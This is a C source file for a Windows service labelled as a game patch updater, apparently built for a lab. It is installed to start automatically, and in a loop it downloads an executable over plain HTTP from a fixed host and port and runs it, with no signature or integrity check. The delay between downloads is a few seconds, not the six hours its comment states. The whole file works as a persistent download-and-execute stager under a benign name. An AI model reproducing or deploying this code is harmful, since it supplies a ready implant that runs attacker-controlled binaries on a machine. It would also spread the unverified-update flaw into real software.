#include <windows.h>
#include <stdio.h>
#include <wininet.h> // For InternetOpen and InternetReadFile
#include <shellapi.h> // For ShellExecute
// x86_64-w64-mingw32-gcc -o MySampleService.exe gamepatchservice.c -lws2_32 -lkernel32 -lwininet -lws2_32 -lwinmm -lshell32
// create MySampleService binPath= "C:\Users\user1\Downloads\MySampleService.exe" start= auto
// sc start MySampleService
// sc query MySampleService
// sc delete MySampleService
SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE g_ServiceStopEvent = NULL;

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
void WINAPI ServiceCtrlHandler(DWORD CtrlCode);
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);

#define SERVICE_NAME  "MySampleService"
#define PATCH_URL     "http://192.168.56.1:2020/gamepatch.exe"  // URL of the patch
#define PATCH_FILE    "C:\\Game\\gamepatch.exe"           // Local file path to save the patch
#define SLEEP_TIME    1500 //360 * 60 * 1000                     // 360 minutes (6 hours) in milliseconds

int main(int argc, char *argv[]) {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        { SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION) ServiceMain },
        { NULL, NULL }
    };

    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE) {
        printf("Error: StartServiceCtrlDispatcher\n");
        return GetLastError();
    }

    return 0;
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

    if (g_StatusHandle == NULL) {
        printf("Error: RegisterServiceCtrlHandler\n");
        return;
    }

    // Initialize service status
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // Create a stop event to signal the service to stop
    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }

    // Set the service status to running
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // Start a thread to perform the work (downloading and executing patches)
    HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(g_ServiceStopEvent);

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

void WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
    switch (CtrlCode) {
        case SERVICE_CONTROL_STOP:
            if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING) {
                break;
            }

            // Signal the service to stop
            g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

            SetEvent(g_ServiceStopEvent);
            break;

        default:
            break;
    }
}

// Function to download a file from the internet
BOOL DownloadFile(LPCSTR url, LPCSTR localFilePath) {
    HINTERNET hInternet = InternetOpen("GamePatchDownloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return FALSE;
    }

    HINTERNET hFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    HANDLE hLocalFile = CreateFile(localFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hLocalFile == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    BYTE buffer[4096];
    DWORD bytesRead, bytesWritten;

    // Read from the Internet and write to the local file
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        WriteFile(hLocalFile, buffer, bytesRead, &bytesWritten, NULL);
        if (bytesWritten != bytesRead) {
            // Error occurred in writing to the file
            CloseHandle(hLocalFile);
            InternetCloseHandle(hFile);
            InternetCloseHandle(hInternet);
            return FALSE;
        }
    }

    CloseHandle(hLocalFile);
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    return TRUE;
}

DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
    while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
        // Perform the download and execution every 360 minutes
        if (DownloadFile(PATCH_URL, PATCH_FILE)) {
            // Execute the downloaded patch
            ShellExecute(NULL, "open", PATCH_FILE, NULL, NULL, SW_SHOWNORMAL);
        } else {
            printf("Error: Failed to download the patch.\n");
        }

        // Wait for 360 minutes before checking again
        Sleep(SLEEP_TIME);
    }

    return ERROR_SUCCESS;
}
